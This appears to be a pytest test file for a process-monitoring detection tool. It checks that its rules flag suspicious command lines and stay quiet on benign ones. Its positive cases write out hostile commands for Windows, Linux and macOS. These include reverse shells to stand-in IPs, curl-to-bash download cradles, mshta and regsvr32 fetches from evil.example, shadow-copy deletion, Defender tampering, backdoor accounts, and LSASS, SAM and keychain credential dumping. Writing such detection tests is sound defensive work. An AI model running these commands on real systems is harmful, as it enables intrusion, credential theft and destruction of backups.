import pytest

from filespy.events import Severity, summarize
from filespy.procrules import CMD_RULES, ProcInfo, command_indicators, evaluate, lookalike_of
from filespy.state import SharedState

W, L, M = "win32", "linux", "darwin"

# (platform, rule id, command line that must match)
POSITIVE = [
    (W, "ps_encoded", "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"),
    (W, "ps_encoded", 'powershell -e "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"'),
    (W, "ps_encoded", "pwsh -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"),
    (W, "ps_hidden_bypass", "powershell -w hidden -ep bypass -file a.ps1"),
    (W, "ps_hidden_bypass", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\x.ps1"),
    (W, "ps_download", "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\""),
    (W, "ps_download", "powershell Invoke-WebRequest http://x/a.exe -OutFile a.exe"),
    (W, "ps_decode_run", "powershell -c [Convert]::FromBase64String($x)"),
    (W, "defender_tamper", "powershell Set-MpPreference -DisableRealtimeMonitoring $true"),
    (W, "defender_tamper", "powershell.exe Add-MpPreference -ExclusionPath C:\\Users\\Public"),
    (W, "mshta_remote", "mshta.exe http://evil.example/a.hta"),
    (W, "mshta_remote", 'mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc""")'),
    (W, "regsvr32_scriptlet", "regsvr32 /s /n /u /i:http://evil.example/a.sct scrobj.dll"),
    (W, "rundll32_abuse", 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)'),
    (W, "rundll32_abuse", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full"),
    (W, "certutil_download", "certutil.exe -urlcache -split -f http://x/a.exe a.exe"),
    (W, "certutil_decode", "certutil -decode a.txt a.exe"),
    (W, "bitsadmin_transfer", "bitsadmin /transfer job /download /priority high http://x/a.exe C:\\a.exe"),
    (W, "wmic_exec", "wmic process call create \"cmd /c calc\""),
    (W, "shadow_delete", "vssadmin.exe delete shadows /all /quiet"),
    (W, "shadow_delete", "wmic shadowcopy delete"),
    (W, "shadow_delete", "bcdedit /set {default} recoveryenabled No"),
    (W, "log_clear", "wevtutil cl Security"),
    (W, "schtasks_create_suspicious", "schtasks /create /tn Upd /tr \"powershell -w hidden -file C:\\a.ps1\" /sc onlogon"),
    (W, "schtasks_create_suspicious", "schtasks.exe /Create /SC MINUTE /TN x /TR C:\\Users\\bob\\AppData\\Roaming\\x.exe"),
    (W, "schtasks_create", "schtasks /create /tn Backup /tr \"C:\\Program Files\\App\\b.exe\" /sc daily"),
    (W, "reg_persistence", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d C:\\x.exe /f"),
    (W, "reg_security_tamper", 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'),
    (W, "service_create", "sc create Upd binPath= C:\\ProgramData\\u.exe start= auto"),
    (W, "firewall_tamper", "netsh advfirewall set allprofiles state off"),
    (W, "security_tool_stop", "sc stop WinDefend"),
    (W, "security_tool_stop", "taskkill /f /im MsMpEng.exe"),
    (W, "account_add", "net user backdoor P@ss /add"),
    (W, "account_add", "net localgroup administrators backdoor /add"),
    (W, "credential_dump", "procdump64.exe -ma lsass.exe l.dmp"),
    (W, "credential_dump", "reg save HKLM\\SAM sam.hiv"),
    (W, "script_from_user_dir", "wscript.exe C:\\Users\\bob\\AppData\\Local\\Temp\\run.vbs"),
    (W, "attrib_hide", "attrib +h +s C:\\Users\\Public\\a.exe"),
    (W, "tunnel_tool", "C:\\t\\ngrok.exe tcp 3389"),
    (W, "miner", "xmrig.exe -o stratum+tcp://pool.example:3333 --donate-level 1"),
    (L, "reverse_shell", "bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
    (L, "reverse_shell", "nc -e /bin/sh 10.0.0.1 4444"),
    (L, "reverse_shell", "python3 -c import pty;pty.spawn('/bin/bash')"),
    (L, "reverse_shell", "socat tcp:10.0.0.1:4444 exec:/bin/sh,pty,stderr"),
    (L, "pipe_to_shell", "sh -c curl -fsSL http://x/i.sh | bash"),
    (L, "pipe_to_shell", "sh -c wget -qO- http://x/i.sh | sudo sh"),
    (L, "base64_to_shell", "sh -c echo aGk= | base64 -d | sh"),
    (L, "history_tamper", "bash -c unset HISTFILE; ls"),
    (L, "security_disable", "systemctl stop auditd"),
    (L, "security_disable", "ufw disable"),
    (L, "preload_write", "sh -c echo /tmp/x.so >> /etc/ld.so.preload"),
    (L, "preload_env", "env LD_PRELOAD=/tmp/x.so /usr/bin/id"),
    (L, "cron_edit", "sh -c (crontab -l; echo '@reboot /tmp/x') | crontab -"),
    (L, "miner", "./xmrig --coin=monero -o pool:3333"),
    (M, "osascript_prompt", 'osascript -e display dialog "Password" default answer "" with hidden answer'),
    (M, "quarantine_removed", "xattr -d com.apple.quarantine /Users/a/Downloads/x.app"),
    (M, "gatekeeper_off", "spctl --master-disable"),
    (M, "keychain_dump", "security find-generic-password -ga Chrome -w"),
    (M, "launchctl_temp", "launchctl load /tmp/com.x.plist"),
    (M, "reverse_shell", "bash -i >& /dev/tcp/1.2.3.4/9001 0>&1"),
]

# (platform, benign command line that must produce no indicator at all)
NEGATIVE = [
    (W, "powershell.exe -NoProfile -File C:\\Scripts\\backup.ps1"),
    (W, "powershell -Command Get-Process | Sort-Object CPU"),
    (W, "powershell -ExecutionPolicy Bypass -File C:\\tools\\build.ps1"),
    (W, "C:\\Windows\\System32\\rundll32.exe shell32.dll,Control_RunDLL desk.cpl"),
    (W, "regsvr32 /s C:\\Windows\\System32\\vbscript.dll"),
    (W, "certutil -hashfile a.iso SHA256"),
    (W, "mshta.exe C:\\Program Files\\App\\ui.hta"),
    (W, "schtasks /query /fo csv"),
    (W, "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
    (W, "sc query WinDefend"),
    (W, "net user"),
    (W, "netsh advfirewall show allprofiles"),
    (W, "vssadmin list shadows"),
    (W, "wevtutil qe System /c:5"),
    (W, "attrib +r notes.txt"),
    (W, "wscript.exe C:\\Program Files\\Vendor\\helper.vbs"),
    (W, "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer"),
    (L, "nc -zv example.com 443"),
    (L, "curl -fsSL https://example.com/file.tar.gz -o file.tar.gz"),
    (L, "base64 -d input.b64"),
    (L, "bash -c ls -la /tmp"),
    (L, "crontab -l"),
    (L, "systemctl status auditd"),
    (L, "iptables -L -n"),
    (L, "python3 -m http.server 8000"),
    (L, "wget https://example.com/a.iso"),
    (M, "osascript -e tell application \"Finder\" to activate"),
    (M, "xattr -l /Applications/Safari.app"),
    (M, "spctl --status"),
    (M, "launchctl list"),
    (M, "security find-certificate -a"),
]


@pytest.mark.parametrize("platform,rule,command", POSITIVE)
def test_command_rules_match(platform, rule, command):
    assert f"proc.cmd.{rule}" in {i.id for i in command_indicators(command, platform)}


@pytest.mark.parametrize("platform,command", NEGATIVE)
def test_benign_commands_are_quiet(platform, command):
    assert command_indicators(command, platform) == []


def test_every_rule_has_a_positive_test():
    tested = {rule for _p, rule, _c in POSITIVE}
    assert {r.id for r in CMD_RULES} <= tested


def test_windows_rules_do_not_fire_on_linux_and_long_input_is_fast():
    assert command_indicators("vssadmin delete shadows /all", L) == []
    import time
    start = time.monotonic()
    command_indicators("powershell " + "-e " * 20000 + "a" * 50000, W)
    command_indicators("schtasks /create " + "x " * 50000, W)
    assert time.monotonic() - start < 2.0


@pytest.mark.parametrize(
    "name,target",
    [("svch0st.exe", "svchost.exe"), ("scvhost.exe", "svchost.exe"), ("svchosts.exe", "svchost.exe"),
     ("lsasss.exe", "lsass.exe"), ("expl0rer.exe", "explorer.exe"), ("csrss\u0430.exe", "csrss.exe"),
     ("svchost.exe", ""), ("taskhost.exe", ""), ("chrome.exe", ""), ("service.exe", ""), ("notepad.exe", "")],
)
def test_lookalike(name, target):
    assert lookalike_of(name) == target


def ids(indicators):
    return {i.id for i in indicators}


def test_masquerade_and_parent_child():
    fake = ProcInfo(1, "svchost.exe", r"C:\Users\bob\AppData\Roaming\svchost.exe")
    assert "proc.system_name_wrong_dir" in ids(evaluate(fake, W))
    real = ProcInfo(2, "svchost.exe", r"C:\Windows\System32\svchost.exe", ["svchost.exe", "-k", "netsvcs"])
    assert evaluate(real, W) == []
    macro = ProcInfo(3, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     ["powershell.exe"], parent_name="WINWORD.EXE")
    assert "proc.office_child" in ids(evaluate(macro, W))
    normal = ProcInfo(4, "cmd.exe", r"C:\Windows\System32\cmd.exe", ["cmd.exe"], parent_name="explorer.exe")
    assert evaluate(normal, W) == []
    decoy = ProcInfo(5, "invoice.pdf.exe", r"C:\Users\bob\Downloads\invoice.pdf.exe")
    assert "proc.double_extension" in ids(evaluate(decoy, W))


def test_dropped_file_executed_and_young_image(tmp_path):
    exe = tmp_path / "payload"
    exe.write_bytes(b"x")
    state = SharedState()
    proc = ProcInfo(10, "payload", str(exe), [str(exe)])
    assert "proc.dropped_file_executed" not in ids(evaluate(proc, L, state))
    state.note_drop(str(exe), "abc", "ev1", score=40)
    found = evaluate(proc, L, state)
    assert {"proc.dropped_file_executed", "proc.young_image"} <= ids(found)
    assert summarize(found)[1] >= Severity.HIGH
    state.note_drop(str(exe), "abc", "ev1", score=90)
    assert summarize(evaluate(proc, L, state))[1] is Severity.CRITICAL
    old = evaluate(proc, L, None, now=exe.stat().st_mtime + 86400)
    assert "proc.young_image" not in ids(old)


def test_deleted_image_on_linux():
    proc = ProcInfo(11, "x", "/tmp/x (deleted)")
    assert "proc.deleted_image" in ids(evaluate(proc, L))
